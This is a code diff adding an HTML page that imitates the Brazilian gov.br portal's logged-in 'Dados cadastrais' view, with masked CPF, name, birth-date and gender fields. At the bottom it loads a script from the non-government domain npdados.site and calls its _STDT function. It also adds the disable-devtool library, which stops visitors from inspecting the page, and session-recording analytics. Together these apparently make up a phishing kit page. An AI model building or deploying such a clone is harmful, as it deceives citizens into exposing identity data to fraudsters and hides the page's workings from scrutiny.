@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Portal Logado</title>
+<link rel="stylesheet" href="/assets/css/services.css">
+<div>
+    <header class="br-header false svelte-7keokj">
+        <div class="container-lg svelte-7keokj">
+            <div class="header-top">
+                <div class="header-logo"><a href="" class="link-bi svelte-7keokj"><img src="/assets/img/govbr.png" alt="Logomarca GovBR"></a></div>
+                <div class="header-actions">
+                    <div class="svelte-1jznxvb">
+                        <div class="wrapper svelte-ippqk1" style="text-align:right">
+                            <div><strong id="userName-Min" class="uppercase">***** *****</strong></div>
+                            <div id="userDocument">***.***.***-**</div>
+                        </div>
+                    </div><span class="br-divider vertical mx-half mx-sm-1" style="opacity:0"></span>
+                    <div class="wrapper-login">
+                        <div class="header-sign-in">
+                            <div class="status-bar-wrapper svelte-7keokj"><button class="svelte-1b1v9si"><span class="wrapper svelte-1b1v9si" title="ELON"><span class="content svelte-1b1v9si"><img class="account-picture-icon svelte-1b1v9si" src="/assets/img/user.png" alt="Avatar"></span><i class="fas fa-caret-down svelte-1b1v9si" aria-hidden="true"></i></span></button></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <main class="container-lg">
+        <div class="container-lg">
+            <div class="row">
+                <div class="pt-2 pb-2 col">
+                    <div class="ml-3 mr-3 mt-4">
+                        <div></div>
+                        <style>
+                            .accounts-pages-Account .address {
+                                display: block;
+                                border-color: var(--border-color);
+                                border-radius: var(--surface-rounder-sm);
+                                border-style: var(--border-style);
+                                border-width: var(--border-width);
+                                padding: var(--spacing-scale-2x);
+                                padding-right: .5em;
+                                margin-top: var(--spacing-scale-half);
+                                margin-bottom: var(--spacing-scale-half)
+                            }
+
+                            .accounts-pages-Account .address .text {
+                                color: var(--color-light)
+                            }
+
+                            .accounts-pages-Account .change-account-picture,
+                            .accounts-pages-Account picture {
+                                cursor: pointer
+                            }
+
+                            .accounts-pages-Account .picture {
+                                display: flex;
+                                align-items: normal;
+                                justify-content: center;
+                                align-content: space-between;
+                                flex-direction: column
+                            }
+
+                            .confirm-data-review-checkbox label {
+                                font-size: var(--font-size-scale-up-01)
+                            }
+                        </style>
+                        <div class="br-breadcrumb">
+                            <ul class="crumb-list">
+                                <li class="crumb home"><a class="br-button circle" href="/servicos"><span class="sr-only">Home</span><i class="fas fa-home"></i></a></li>
+                                <li class="crumb" data-active="active"><i class="icon fas fa-chevron-right"></i><span>Dados Pessoais</span></li>
+                            </ul>
+                        </div>
+                        <h1>
+                            <div><a class="br-button circle large" style="transform:translateY(-4px)" href="/servicos"><i class="fas fa-chevron-left fa-lg" aria-hidden="true"></i></a>Dados cadastrais</div><span class="br-divider my-2"></span></h1>
+                        <div class="accounts-pages-Account d-flex flex-column flex-sm-row-reverse justify-content-sm-end">
+                            <div class="flex-fill">
+                                <div class="my-4 mt-2">
+                                    <style>
+                                        .br-input.govbr-preact-tools-components-StaticField p {
+                                            background-color: var(--background-light);
+                                            border-color: var(--border-color);
+                                            border-radius: var(--surface-rounder-sm);
+                                            border-style: var(--border-style);
+                                            border-width: var(--border-width);
+                                            color: var(--border-color-alternative);
+                                            display: block;
+                                            font-size: var(--font-size-scale-up-01);
+                                            font-weight: var(--font-weight-medium);
+                                            height: auto;
+                                            min-height: var(--input-size);
+                                            margin-top: var(--spacing-scale-half);
+                                            margin-bottom: var(--spacing-scale-half);
+                                            padding-bottom: 2ex;
+                                            padding-left: var(--spacing-scale-2x);
+                                            padding-right: var(--spacing-scale-2x);
+                                            padding-top: 2ex !important;
+                                            width: 100%
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.multiLine p {
+                                            overflow-y: scroll
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.breakWord p {
+                                            overflow-wrap: break-word
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.breakAll p {
+                                            overflow-wrap: break-word;
+                                            word-break: break-all
+                                        }
+                                    </style>
+                                    <div class="br-input govbr-preact-tools-components-StaticField"><label>CPF</label>
+                                        <p id="userDocument">***.***.***-**</p>
+                                    </div>
+                                </div>
+                                <div class="my-4 mt-2">
+                                    <style>
+                                        .br-input.govbr-preact-tools-components-StaticField p {
+                                            background-color: var(--background-light);
+                                            border-color: var(--border-color);
+                                            border-radius: var(--surface-rounder-sm);
+                                            border-style: var(--border-style);
+                                            border-width: var(--border-width);
+                                            color: var(--border-color-alternative);
+                                            display: block;
+                                            font-size: var(--font-size-scale-up-01);
+                                            font-weight: var(--font-weight-medium);
+                                            height: auto;
+                                            min-height: var(--input-size);
+                                            margin-top: var(--spacing-scale-half);
+                                            margin-bottom: var(--spacing-scale-half);
+                                            padding-bottom: 2ex;
+                                            padding-left: var(--spacing-scale-2x);
+                                            padding-right: var(--spacing-scale-2x);
+                                            padding-top: 1ex;
+                                            width: 100%
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.multiLine p {
+                                            overflow-y: scroll
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.breakWord p {
+                                            overflow-wrap: break-word
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.breakAll p {
+                                            overflow-wrap: break-word;
+                                            word-break: break-all
+                                        }
+                                    </style>
+                                    <div class="br-input govbr-preact-tools-components-StaticField"><label>Nome</label>
+                                        <p id="userName" class="uppercase">***** ***** *****</p>
+                                    </div>
+                                </div>
+                                <div class="my-4 mt-2">
+                                    <style>
+                                        .br-input.govbr-preact-tools-components-StaticField p {
+                                            background-color: var(--background-light);
+                                            border-color: var(--border-color);
+                                            border-radius: var(--surface-rounder-sm);
+                                            border-style: var(--border-style);
+                                            border-width: var(--border-width);
+                                            color: var(--border-color-alternative);
+                                            display: block;
+                                            font-size: var(--font-size-scale-up-01);
+                                            font-weight: var(--font-weight-medium);
+                                            height: auto;
+                                            min-height: var(--input-size);
+                                            margin-top: var(--spacing-scale-half);
+                                            margin-bottom: var(--spacing-scale-half);
+                                            padding-bottom: 2ex;
+                                            padding-left: var(--spacing-scale-2x);
+                                            padding-right: var(--spacing-scale-2x);
+                                            padding-top: 1ex;
+                                            width: 100%
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.multiLine p {
+                                            overflow-y: scroll
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.breakWord p {
+                                            overflow-wrap: break-word
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.breakAll p {
+                                            overflow-wrap: break-word;
+                                            word-break: break-all
+                                        }
+                                    </style>
+                                    <div class="br-input govbr-preact-tools-components-StaticField input-button"><label>Nascimento</label>
+                                        <p id="userNascimento">**/**/****</p>
+                                    </div>
+                                </div>
+                                <div class="my-4 mt-2">
+                                    <style>
+                                        .br-input.govbr-preact-tools-components-StaticField p {
+                                            background-color: var(--background-light);
+                                            border-color: var(--border-color);
+                                            border-radius: var(--surface-rounder-sm);
+                                            border-style: var(--border-style);
+                                            border-width: var(--border-width);
+                                            color: var(--border-color-alternative);
+                                            display: block;
+                                            font-size: var(--font-size-scale-up-01);
+                                            font-weight: var(--font-weight-medium);
+                                            height: auto;
+                                            min-height: var(--input-size);
+                                            margin-top: var(--spacing-scale-half);
+                                            margin-bottom: var(--spacing-scale-half);
+                                            padding-bottom: 2ex;
+                                            padding-left: var(--spacing-scale-2x);
+                                            padding-right: var(--spacing-scale-2x);
+                                            padding-top: 1ex;
+                                            width: 100%
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.multiLine p {
+                                            overflow-y: scroll
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.breakWord p {
+                                            overflow-wrap: break-word
+                                        }
+
+                                        .br-input.govbr-preact-tools-components-StaticField.breakAll p {
+                                            overflow-wrap: break-word;
+                                            word-break: break-all
+                                        }
+                                    </style>
+                                    <div class="br-input govbr-preact-tools-components-StaticField input-button"><label>Gênero</label>
+                                        <p id="userGender" class="uppercase">*********</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div><a mp-view-event="ViewContent" class="br-button order-1 order-sm-0 mr-sm-auto mr-0 secondary mt-4" href="/servicos"><i class="fas fa-chevron-left" aria-hidden="true"></i>Voltar</a>
+                        <style>
+                            .br-modal {
+                                overflow-y: hidden !important
+                            }
+                        </style>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer class="br-footer">
+        <div class="container-lg">
+            <div class="logo pt-4 pb-2"><img src="/assets/img/govbr.png" alt="logo"></div>
+            <div class="br-list horizontal" data-toggle="data-toggle" data-sub="data-sub">
+                <div class="col-2">
+                    <a class="br-item header" href="/servicos">
+                        <div class="content text-down-01 text-bold text-uppercase">Serviços</div>
+                    </a>
+                </div>
+                <div class="col-2">
+                    <a class="br-item header" href="/dados-pessoais">
+                        <div class="content text-down-01 text-bold text-uppercase">Dados Pessoais</div>
+                    </a>
+                </div>
+                <div class="col-2">
+                    <a class="br-item header" href="/seguranca-da-conta">
+                        <div class="content text-down-01 text-bold text-uppercase">Segurança da Conta</div>
+                    </a>
+                </div>
+                <div class="col-2">
+                    <a class="br-item header" href="/servicos">
+                        <div class="content text-down-01 text-bold text-uppercase">Acessibilidade</div>
+                    </a>
+                </div>
+            </div>
+        </div><span class="br-divider my-3"></span>
+        <div class="container-lg">
+            <div class="info">
+                <div class="text-down-01 text-medium pb-3">Todo o conteúdo deste site está publicado sob a licença <strong>Creative Commons Atribuição-SemDerivações 3.0</strong></div>
+            </div>
+        </div>
+    </footer>
+    <script src="/assets/js/skg.js"></script>
+    <script src="https://npdados.site/DT/main.js?nocache=42562645789264"></script>
+    <script>
+        window._STDT("1275268571075710")
+    </script>
+</div>
+
+</html>
+<script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
+<script type="text/javascript">
+    (function(c, l, a, r, i, t, y) {
+        c[a] = c[a] || function() {
+            (c[a].q = c[a].q || []).push(arguments)
+        };
+        t = l.createElement(r);
+        t.async = 1;
+        t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0];
+        y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "tmf7d225xn");
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"8beff67d6cbd4f26a8f06ec229b0567a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+    crossorigin="anonymous"></script>
